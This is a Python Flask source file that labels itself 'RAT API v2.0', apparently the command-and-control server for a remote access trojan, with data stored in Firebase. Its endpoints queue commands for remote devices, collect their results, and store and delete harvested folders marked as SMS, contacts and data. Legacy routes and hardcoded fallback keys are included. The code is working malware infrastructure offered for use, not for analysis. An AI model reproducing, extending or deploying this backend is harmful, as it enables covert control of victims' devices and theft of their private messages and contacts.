import subprocess
import sys

try:
    import firebase_admin
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "firebase-admin"])
    import firebase_admin

from flask import Flask, request, jsonify
from firebase_admin import credentials, db
from datetime import datetime
import os
import json
import hashlib
import hmac

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
service_account_json = os.environ.get('FIREBASE_SERVICE_ACCOUNT')
if not service_account_json:
    raise ValueError("FIREBASE_SERVICE_ACCOUNT not set!")

cred = credentials.Certificate(json.loads(service_account_json))
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://videohostvip-default-rtdb.firebaseio.com'
})

# ========== CONFIG ==========
API_SECRET = os.environ.get('API_SECRET', 'my-secret-key-2024')
API_KEY = os.environ.get('API_KEY', 'rat-api-key-2024')

# ========== AUTH HELPER ==========
def require_auth(f):
    def wrapper(*args, **kwargs):
        auth_header = request.headers.get('Authorization', '')
        api_key = request.headers.get('X-API-Key', '')
        
        if not auth_header and not api_key:
            return jsonify({"status": "error", "message": "Missing Authorization"}), 401
        
        if api_key:
            if api_key != API_KEY:
                return jsonify({"status": "error", "message": "Invalid API Key"}), 401
        elif auth_header.startswith('Bearer '):
            token = auth_header[7:]
            if token != API_KEY:
                return jsonify({"status": "error", "message": "Invalid Token"}), 401
        else:
            return jsonify({"status": "error", "message": "Invalid Authorization"}), 401
            
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

def gen_device_token(device_id):
    return hmac.new(API_SECRET.encode(), device_id.encode(), hashlib.sha256).hexdigest()

# ========== ROOT ==========
@app.route('/')
def root():
    return jsonify({
        "api": "RAT API v2.0",
        "status": "healthy",
        "docs": "/health"
    })

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "time": str(datetime.now()),
        "firebase": "connected"
    })

# ========== DEVICE AUTH ==========
@app.route('/auth/<device_id>', methods=['POST'])
def device_auth(device_id):
    body = request.get_json() or {}
    pin = body.get('pin', '')
    if pin == os.environ.get('DEVICE_PIN', '0000'):
        token = gen_device_token(device_id)
        return jsonify({"status": "success", "token": token})
    return jsonify({"status": "error", "message": "Invalid PIN"}), 401

# ========== FOLDERS (SMS/Contacts/Data) ==========
@app.route('/folders/<folder>', methods=['GET'])
@require_auth
def get_folder(folder):
    ref = db.reference(f'/{folder}')
    data = ref.get()
    return jsonify({"status": "success", "folder": folder, "data": data or {}, "count": len(data) if data else 0})

@app.route('/folders/<folder>', methods=['POST'])
@require_auth
def post_to_folder(folder):
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400
    ref = db.reference(f'/{folder}')
    new_ref = ref.push(data)
    return jsonify({"status": "success", "key": new_ref.key}), 201

@app.route('/folders/<folder>', methods=['DELETE'])
@require_auth
def delete_folder(folder):
    db.reference(f'/{folder}').delete()
    return jsonify({"status": "success", "message": f"Folder {folder} deleted"})

@app.route('/folders/<folder>/<item>', methods=['DELETE'])
@require_auth
def delete_folder_item(folder, item):
    db.reference(f'/{folder}/{item}').delete()
    return jsonify({"status": "success", "message": f"Item {item} deleted"})

# ========== DEVICES & COMMANDS ==========
@app.route('/devices/<device_id>/commands', methods=['POST'])
@require_auth
def send_command(device_id):
    data = request.get_json()
    command = data.get('command')
    if not command:
        return jsonify({"status": "error", "message": "Command required"}), 400
    
    ref = db.reference(f'/commands/{device_id}')
    ref.push({
        'command': command,
        'params': data.get('params', {}),
        'time': str(datetime.now()),
        'status': 'pending'
    })
    return jsonify({"status": "success", "command": command}), 201

@app.route('/devices/<device_id>/commands', methods=['GET'])
@require_auth
def get_pending_commands(device_id):
    ref = db.reference(f'/commands/{device_id}')
    commands = ref.get()
    if commands:
        for key, cmd in commands.items():
            if cmd.get('status') == 'pending':
                return jsonify({"status": "success", "command_id": key, "command": cmd})
    return jsonify({"status": "success", "command": None})

@app.route('/devices/<device_id>/commands/<command_id>', methods=['PUT'])
@require_auth
def complete_command(device_id, command_id):
    db.reference(f'/commands/{device_id}/{command_id}').update({'status': 'completed'})
    return jsonify({"status": "success"})

# ========== RESULTS ==========
@app.route('/devices/<device_id>/results', methods=['POST'])
@require_auth
def post_result(device_id):
    data = request.get_json()
    ref = db.reference(f'/results/{device_id}')
    ref.push({
        'command': data.get('command'),
        'result': data.get('result'),
        'time': str(datetime.now())
    })
    return jsonify({"status": "success"}), 201

@app.route('/devices/<device_id>/results', methods=['GET'])
@require_auth
def get_results(device_id):
    ref = db.reference(f'/results/{device_id}')
    results = ref.get()
    return jsonify({"status": "success", "device": device_id, "data": results or {}})

# ========== BACKWARD COMPATIBLE (OLD URLS) ==========
@app.route('/send/<folder>', methods=['POST'])
@require_auth
def legacy_send(folder):
    return post_to_folder(folder)

@app.route('/showdata/<folder>', methods=['GET'])
@require_auth
def legacy_show(folder):
    return get_folder(folder)

@app.route('/clear/<folder>', methods=['DELETE'])
@require_auth
def legacy_clear(folder):
    return delete_folder(folder)

@app.route('/clear/<folder>/<item>', methods=['DELETE'])
@require_auth
def legacy_clear_item(folder, item):
    return delete_folder_item(folder, item)

@app.route('/command/<device_id>', methods=['POST'])
@require_auth
def legacy_command(device_id):
    return send_command(device_id)

@app.route('/getcommand/<device_id>', methods=['GET'])
@require_auth
def legacy_get_command(device_id):
    return get_pending_commands(device_id)

@app.route('/commanddone/<device_id>/<command_id>', methods=['POST'])
@require_auth
def legacy_command_done(device_id, command_id):
    return complete_command(device_id, command_id)

@app.route('/sendresult/<device_id>', methods=['POST'])
@require_auth
def legacy_result(device_id):
    return post_result(device_id)

@app.route('/getresults/<device_id>', methods=['GET'])
@require_auth
def legacy_get_results(device_id):
    return get_results(device_id)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
